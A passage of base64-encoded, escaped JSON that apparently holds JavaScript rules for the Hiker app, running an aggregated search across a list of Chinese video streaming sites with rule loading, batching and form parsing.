tcGFnZVxcXFxcXFwiICsgcDtcXFxcbiAgICBpZiAoZGF0YS5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLliqDovb3nrKxcXFxcXFxcIiArIHAgKyBcXFxcXFxcIumhteS4re+8jOi/m+W6pu+8mjEvXFxcXFxcXCIgKyBkYXRhLmxlbmd0aCxcXFxcbiAgICAgICAgICAgIHVybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGRlc2M6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBwaWNfdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBpZDogcGFnZWlkXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgICBzZXRSZXN1bHQoZCk7XFxcXG4gICAgbG9nKGRhdGEubGVuZ3RoKTtcXFxcbiAgICBpZiAoZGF0YS5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgIC8v5aSa57q/56iL5Yqg6L29ICAgICAgICBcXFxcbiAgICAgICAgbGV0IHJlYWxQYWdlID0gXFxcXFxcXCJcXFxcXFxcIiA9PSByID8gMSA6IHA7XFxcXG4gICAgICAgIGxldCB0YXNrcyA9IGRhdGEubWFwKGl0ID0+IHtcXFxcbiAgICAgICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgICAgICAgZnVuYzogZnVuY3Rpb24ocnVsZSkge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gcnVsZS5maW5kKHMsIHJlYWxQYWdlKTtcXFxcbiAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgIHBhcmFtOiBpdCxcXFxcbiAgICAgICAgICAgICAgICBpZDogXFxcXFxcXCJydWxlQFxcXFxcXFwiICsgaXQubmFtZVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICBiYXRjaEV4ZWN1dGUodGFza3MsIHtcXFxcbiAgICAgICAgICAgIGZ1bmM6IGZ1bmN0aW9uKHBhcmFtLCBpZCwgZXJyb3IsIHJlc3VsdCkge1xcXFxuICAgICAgICAgICAgICAgIC8vbG9nKFxcXFxcXFwibGlzdGVuZXI6IFxcXFxcXFwiICsgKHJlc3VsdCB8fCBbXSkubGVuZ3RoKVxcXFxuICAgICAgICAgICAgICAgIHBhcmFtLmkgPSBwYXJhbS5pICsgMTtcXFxcbiAgICAgICAgICAgICAgICBpZiAocmVzdWx0KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpdCBvZiByZXN1bHQpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJhbS5qID0gcGFyYW0uaiArIDE7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkSXRlbUJlZm9yZShwYWdlaWQsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHdyYXAoaXQudGl0bGUsIHMpLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBpdC5kZXNjLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGl0LnVybCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGljX3VybDogaXQucGljX3VybCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IGl0LnBpY191cmwgPyAnbW92aWVfMV92ZXJ0aWNhbF9waWMnIDogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXh0cmE6IGl0LmV4dHJhXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge31cXFxcblxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBpZiAocGFyYW0uaSA+PSBwYXJhbS5hbGwpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbShwYWdlaWQpXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbSh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLliqDovb3nrKxcXFxcXFxcIiArIE1ZX1BBR0UgKyBcXFxcXFxcIumhteS4re+8jOi/m+W6pu+8mlxcXFxcXFwiICsgKHBhcmFtLmkgKyAxKSArIFxcXFxcXFwiL1xcXFxcXFwiICsgcGFyYW0uYWxsLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBwYWdlaWRcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgcGFyYW06IHtcXFxcbiAgICAgICAgICAgICAgICBhbGw6IGRhdGEubGVuZ3RoLFxcXFxuICAgICAgICAgICAgICAgIGk6IDAsXFxcXG4gICAgICAgICAgICAgICAgajogLTFcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSlcXFxcbiAgICB9XFxcXG59IGVsc2Uge1xcXFxuICAgIGxldCB7XFxcXG4gICAgICAgIGxvYWRcXFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFxcXFxcIik7XFxcXG4gICAgbGV0IGRhdGEgPSBsb2FkKC0xLCBudWxsKTtcXFxcbiAgICBpZiAoZGF0YS5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9tYW5hZ2VcXFxcXFxcIikoZCwgZGF0YS5tYXAoaXQgPT4gaXQubmFtZSkpO1xcXFxuICAgICAgICBmb3IgKGxldCBpdCBvZiBkYXRhKSB7XFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdC5uYW1lLFxcXFxuICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJzZWxlY3Q6Ly9cXFxcXFxcIiArIEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6K+36YCJ5oup5pON5L2cXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbDogMSxcXFxcbiAgICAgICAgICAgICAgICAgICAgb3B0aW9uczogW1xcXFxcXFwi6K6/6Zeu6aaW6aG1XFxcXFxcXCIsIFxcXFxcXFwi5pCc57Si5q2k56uZXFxcXFxcXCJdLFxcXFxuICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygodXJsKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5wdXQgPT0gXFxcXFxcXCLorr/pl67pppbpobVcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1ZX1VSTCA9IHVybDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ4NTovL1xcXFxcXFwiICsgZ2V0SG9tZSh1cmwpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9zaW5nbGVzXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgfSwgaXQudXJsKVxcXFxuICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImZsZXhfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFJVTEU6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6IGl0Lm5hbWUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGl0LnVybFxcXFxuICAgICAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgICAgICBsb25nQ2xpY2s6IFt7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLnpoHnlKhcXFxcXFxcIiArIGl0Lm5hbWUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygobmFtZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpcm0oe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmuKnppqjmj5DnpLpcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudDogXFxcXFxcXCLnoa7orqTliKDpmaTnpoHnlKhcXFxcXFxcIiArIG5hbWUgKyBcXFxcXFxcIuWQl++8n1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChuYW1lLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlbW92ZVJ1bGVcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGF0YT9ydWxlPVxcXFxcXFwiICsgcnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZW1vdmVSdWxlKG5hbWUpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8vT0tcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgbmFtZSwgTVlfUlVMRS50aXRsZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGl0Lm5hbWUpXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuiuv+mXrummlumhtVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAganM6IFxcXFxcXFwiJ3g1Oi8vXFxcXFxcXCIgKyBnZXRIb21lKGl0LnVybCkgKyBcXFxcXFxcIidcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmkJzntKLmraTmupBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGpzOiBcXFxcXFxcIidoaWtlcjovL3BhZ2Uvc2luZ2xlcydcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9XVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG5zZXRSZXN1bHQoZCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5pWw5o2uXFxcIixcXFwicGF0aFxcXCI6XFxcImRhdGFcXFwiLFxcXCJydWxlXFxcIjpcXFwiLy/lubblj5Hop4TliJnmlbBcXFxcbmxldCBzaXplMCA9IDEwO1xcXFxubGV0IHJ1bGVzVGV4dDAgPSBg56iA6aWtQGh0dHBzOi8vd3d3LnhpZmFueXMuY29tL3lpbmdwaWFuc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKlxcXFxu6L6+6b6fQGh0dHBzOi8vd3d3LmRhZGFndWkubWUvdm9kc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKiZzdWJtaXQ9XFxcXG7ln47luIJAaHR0cHM6Ly93d3cuY2l0eWR5LmNvbS9zZWFyY2guaHRtbD93ZD0qKlxcXFxubGlidmlvQGh0dHBzOi8vd3d3LmxpYnZpby5tZS9zZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqJnN1Ym1pdD1cXFxcbuaWsOinhkBodHRwczovL3d3dy42MDgwZHkxLmNvbS92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxcXG7nnIvnnIt5QGh0dHBzOi8vd3d3LmtrZHkubGl2ZS92b2Qtc2VhcmNoLmh0bWw/d2Q9Kiomc3VibWl0PVxcXFxu6aWt5ZuiQGh0dHBzOi8vd3d3LmZhbnR1YW5oZC5jb20vc2VhcmNoLmh0bWw/d2Q9Kiomc3VibWl0PVxcXFxu5YWN55qEQGh0dHBzOi8vd3d3LmZyZWVvay52aXAvdm9kc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKlxcXFxu54mb6amsQGh0dHBzOi8vd3d3Lm5pdW1hdHYuY2Mvdm9kc2VhcmNoLmh0bWw/d2Q9Kiomc3VibWl0PVxcXFxu5YWN6LS5QGh0dHBzOi8vd3d3LnRoZWZyZWUudmlwL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXFxcbuiOq+aJjuWFlEBodHRwczovL3d3dy5tb3poYXR1LmNvbS9pbmRleC5waHAvdm9kL3NlYXJjaC5odG1sP3dkPSoqXFxcXG7pnLnpm7NAaHR0cHM6Ly9wbHlpbmdzaGkuY29tL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXFxcbuWOgumVv0BodHRwczovL3d3dy5jenNwcC5jb20veHNzZWFyY2g/cT0qKlxcXFxuVk9GQGh0dHBzOi8vd3d3LnZvZmxpeC5jb20vc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKlxcXFxu55S15b2xQGh0dHBzOi8vd3d3LmFwcG1vdmllLmNjL2luZGV4LnBocC92b2Qvc2VhcmNoLmh0bWw/d2Q9Kiomc3VibWl0PVxcXFxu6L+95YmnQGh0dHA6Ly96amRyLnZpcC92b2Qvc2VhcmNoL3dkLyoqLmh0bWxcXFxcbueWr+eLl0BodHRwczovL20uZmVuZ2dvdWR5My5jb20vaW5kZXgucGhwP3M9dm9kLXNlYXJjaC1uYW1lJndkPSoqXFxcXG7lnKjnur9AaHR0cHM6Ly96eHpqLnZpcC92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqJnN1Ym1pdD1cXFxcbuS4g+S4g0BodHRwOi8vYWFhc29mYS5jb20vc2VhcmNoLnBocFxcXFxu5YyX5bedQGh0dHBzOi8vd3d3LmJjd3pnLmNvbS92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS8/d2Q9KipcXFxcbkVGQGh0dHBzOi8vd3d3LnBpbGk1LmNuL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9Kiomc3VibWl0PVxcXFxu5b2x5a62QGh0dHA6Ly95c3pqdmlwLmNvbS9pbmRleC5waHAvdm9kL3NlYXJjaC5odG1sP3dkPSoqXFxcXG7kupTkupRAaHR0cHM6Ly81NTVkeS5jYy92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxcXG7muKPmvKtAaHR0cHM6Ly93d3cuZG0yMDIyLmNvbS92b2RzZWFyY2guaHRtbD93ZD0qKlxcXFxu5Zyo5a62QGh0dHBzOi8venh6ai52aXAvdm9kc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKiZzdWJtaXQ9XFxcXG5waWHlupNAaHR0cHM6Ly9tLnBpYWt1LmNjL3MvLS0tLS0tLS0tLS0tLS8/d2Q9KipcXFxcbuaegeWTgUBodHRwczovL3d3dy5qcHlzLm1lL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXFxcbuiJvui/qkBodHRwczovL2FpZGkudHYvdnNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9Kiomc3VibWl0PVxcXFxu5Lmd5beeQGh0dHA6Ly93d3cuaml1emhvdTkxMS5jb20vc2VhcmNoLnBocD9zZWFyY2h3b3JkPSoqXFxcXG7ljYHljYNAaHR0cDovL3d3dy5xaWFuc2hpaG91c2UuY29tL3NyaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXFxcbum6pueJh0BodHRwOi8vbS5seTM2OC5jb20vaW5kZXgucGhwP3M9dm9kLW1fcy1uYW1lJndkPSoqXFxcXG7np4HkurpAaHR0cHM6Ly9zb3Vtay5jb20vdm9kc2VhcmNoLy0tLS0tLS0tLS0tLS0uaHRtbD93ZD0qKlxcXFxu5pif6L6wQGh0dHA6Ly93d3cucWhkZGouY29tLmNuL3hjeXlzZWFyY2gvKiotLS0tLS0tLS0tLS0tLmh0bWxcXFxcbkNva2V2WUBodHRwczovL2Nva2Vtdi5tZS92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxcXG7niLHnnIt5QGh0dHBzOi8vaWthbjYudmlwL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLz93ZD0qKiZzdWJtaXQ9XFxcXG7lubLppa1weUBodHRwczovL3d3dy5nZnlzeXMxLmNvbS92b2RzZWFyY2gvLS0tLS0tLS0tLS0tLS5odG1sP3dkPSoqXFxcXG7lpKnnqbp5QGh0dHA6Ly90a3pucC5jb20vdm9kc2VhcmNoLmh0bWw/d2Q9KipcXFxcbuiTneWFiUBodHRwczovL3d3dy5sZ3l5LmNjL3ZvZHNlYXJjaC8tLS0tLS0tLS0tLS0tLmh0bWw/d2Q9KipcXFxcbuS9juerr0BodHRwczovL2RkeXMudHYvP3M9KiomcG9zdF90eXBlPXBvc3RcXFxcbuWKquWKqkBodHRwczovL3d3dy5udW51eXkzLm9yZy9zby8qKi0qKi0tLmh0bWxgO1xcXFxubGV0IHJ1bGVzVGV4dCA9IGdldEl0ZW0oXFxcXFxcXCJydWxlc1xcXFxcXFwiLCBydWxlc1RleHQwKTtcXFxcbmxldCBzcCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9zcFxcXFxcXFwiKTtcXFxcbnJ1bGVzID0gcnVsZXNUZXh0LnNwbGl0KFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIpXFxcXG4gICAgLmZpbHRlcihpdCA9PiBpdC5pbmNsdWRlcyhcXFxcXFxcIkBcXFxcXFxcIikpXFxcXG4gICAgLm1hcChydWxlID0+IHtcXFxcbiAgICAgICAgbGV0IHMgPSBydWxlLnNwbGl0KFxcXFxcXFwiQFxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgIG5hbWU6IHNbMF0sXFxcXG4gICAgICAgICAgICBmaW5kOiBmdW5jdGlvbihrZXksIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gc3Aoc1sxXSwga2V5LCBzWzBdKTtcXFxcbiAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICB1cmw6IHNbMV1cXFxcbiAgICAgICAgfTtcXFxcbiAgICB9KTtcXFxcblxcXFxuZnVuY3Rpb24gbG9hZChwYWdlLCBydWxlKSB7XFxcXG4gICAgbGV0IHNpemUgPSBwYWdlIDw9IDAgPyBydWxlcy5sZW5ndGggOiBzaXplMDtcXFxcbiAgICBwYWdlID0gcGFnZSA8PSAwID8gMSA6IHBhZ2U7XFxcXG4gICAgaWYgKCFwYWdlICYmICFydWxlKSB7XFxcXG4gICAgICAgIHJldHVybiBydWxlcy5tYXAoaXQgPT4gaXQubmFtZSk7XFxcXG4gICAgfVxcXFxuICAgIGlmIChydWxlICE9IG51bGwpIHtcXFxcbiAgICAgICAgaWYgKHBhZ2UgIT0gbnVsbCAmJiBwYWdlID4gMSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHJ1bGVzLmZpbHRlcihpID0+IGkubmFtZSA9PSBydWxlICYmIGkucGFnZSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIHJ1bGVzLmZpbHRlcihpID0+IGkubmFtZSA9PSBydWxlKTtcXFxcbiAgICB9XFxcXG4gICAgbGV0IHN0YXJ0ID0gKHBhZ2UgLSAxKSAqIHNpemU7XFxcXG4gICAgaWYgKHJ1bGVzLmxlbmd0aCA8IHN0YXJ0ICsgMSkge1xcXFxuICAgICAgICByZXR1cm4gW107XFxcXG4gICAgfVxcXFxuICAgIGxldCBsZW4gPSBzaXplO1xcXFxuICAgIGlmIChydWxlcy5sZW5ndGggPCBwYWdlICogc2l6ZSkge1xcXFxuICAgICAgICBsZW4gPSBydWxlcy5sZW5ndGggLSBzdGFydFxcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gcnVsZXMuc2xpY2Uoc3RhcnQsIHN0YXJ0ICsgbGVuKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gYWRkUnVsZShuYW1lLCBzdXJsKSB7XFxcXG4gICAgc2V0SXRlbShcXFxcXFxcInJ1bGVzXFxcXFxcXCIsIHJ1bGVzVGV4dCArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyBuYW1lICsgXFxcXFxcXCJAXFxcXFxcXCIgKyBzdXJsKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gcmVtb3ZlUnVsZShuYW1lKSB7XFxcXG4gICAgbGV0IG5ld1QgPSBydWxlc1RleHQuc3BsaXQoXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIilcXFxcbiAgICAgICAgLmZpbHRlcihpdCA9PiBpdC5pbmRleE9mKG5hbWUgKyBcXFxcXFxcIkBcXFxcXFxcIikgPCAwKVxcXFxuICAgICAgICAuam9pbihcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiKTtcXFxcbiAgICBzZXRJdGVtKFxcXFxcXFwicnVsZXNcXFxcXFxcIiwgbmV3VCk7XFxcXG59XFxcXG5cXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICBsb2FkOiBsb2FkLFxcXFxuICAgIGFkZFJ1bGU6IGFkZFJ1bGUsXFxcXG4gICAgcmVtb3ZlUnVsZTogcmVtb3ZlUnVsZVxcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaQnOe0ouino+aekFxcXCIsXFxcInBhdGhcXFwiOlxcXCJzcFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJmdW5jdGlvbiBzZWFyY2godXJsLCBrZXksIHJ1bGUpIHtcXFxcbiAgICBsZXQgZCA9IFtdO1xcXFxuICAgIGxldCBodG1sID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICBpZiAodXJsLmluY2x1ZGVzKFxcXFxcXFwiKipcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgLy9nZXTor7fmsYJcXFxcbiAgICAgICAgbGV0IG9sZCA9IHVybDtcXFxcbiAgICAgICAgdXJsID0gdXJsLnJlcGxhY2UoXFxcXFxcXCIqKlxcXFxcXFwiLCBrZXkpO1xcXFxuICAgICAgICBodG1sID0gcmVxdWVzdCh1cmwpO1xcXFxuICAgICAgICAvL+iHquWKqOi/h+mqjOivgeeggeWSjOmikee5geiuv+mXrumZkOWItlxcXFxuICAgICAgICBsZXQge1xcXFxuICAgICAgICAgICAgY2hlY2ssXFxcXG4gICAgICAgICAgICB0ZXN0XFxcXG4gICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UveXptXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoY2hlY2sodXJsLCBodG1sLCBkKSkge1xcXFxuICAgICAgICAgICAgbG9nKFxcXFxcXFwi6YeN6K+V5LqGXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgaHRtbCA9IHJlcXVlc3QodXJsLCB7XFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogdXJsXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdGVzdCh1cmwsIGh0bWwsIGQsIG9sZCwga2V5LCBydWxlKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICAvL+iHquWKqOivhuWIq3Bvc3Tor7fmsYJcXFxcbiAgICAgICAgaHRtbCA9IHJlcXVlc3QodXJsKTtcXFxcbiAgICAgICAgbGV0IGZvcm0gPSBwZGZoKGh0bWwsIFxcXFxcXFwiYm9keSYmZm9ybSYmSHRtbFxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGFjdGlvbiA9IHBkKGh0bWwsIFxcXFxcXFwiZm9ybSYmYWN0aW9uXFxcXFxcXCIsIHVybCk7XFxcXG4gICAgICAgIGxldCBpbnB1dHMgPSBwZGZhKGh0bWwsIFxcXFxcXFwiYm9keSYmZm9ybSYmaW5wdXRcXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCBib2R5ID0ge307XFxcXG4gICAgICAgIGZvciAobGV0IGl0IG9mIGlucHV0cykge1xcXFxuICAgICAgICAgICAgbGV0IG5hbWUgPSBwZGZoKGl0LCBcXFxcXFxcImlucHV0JiZuYW1lXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgaWYgKG5hbWUgJiYgbmFtZSAhPSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHZhbHVlID0gcGRmaChpdCwgXFxcXFxcXCJpbnB1dCYmdmFsdWVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgYm9keVtuYW1lXSA9IHZhbHVlIHx8IGtleTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBodG1sID0gcG9zdChhY3Rpb24sIHtcXFxcbiAgICAgICAgICAgIGJvZHk6IGJvZHlcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgbGV0IGFsaXN0ID0gcGRmYShodG1sLCBcXFxcXFxcImJvZHkmJmFcXFxcXFxcIik7XFxcXG4gICAgbGV0IGFyciA9IGFsaXN0Lm1hcChpdCA9PiB7XFxcXG4gICAgICAgIGxldCB0ID0gcGRmaChpdCwgXFxcXFxcXCJhJiZUZXh0XFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgdDIgPSBwZGZoKGl0LCBcXFxcXFxcImEmJnRpdGxlXFxcXFxcXCIpO1xcXFxuICAgICAgICByZXR1cm4ge1xcXFxuICAgICAgICAgICAgLy9odG1sOiBpdCxcXFxcbiAgICAgICAgICAgIHRleHQ6IHQyICYmIHQyLmluY2x1ZGVzKGtleSkgPyB0MiA6IHQsXFxcXG4gICAgICAgICAgICBocmVmOiBwZChpdCwgXFxcXFxcXCJhJiZocmVmXFxcXFxcXCIsIHVybClcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuXFxcXG4gICAgZnVuY3Rpb24gaXNSZXN1bHQoaXQpIHtcXFxcbiAgICAgICAgaXQgPSBpdC50ZXh0IHx8IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgICAgIGlmIChpdCA9PSBcXFxcXFxcIlxcXFxcXFwiIHx8IGl0Lm1hdGNoKC/mkJzntKJ857u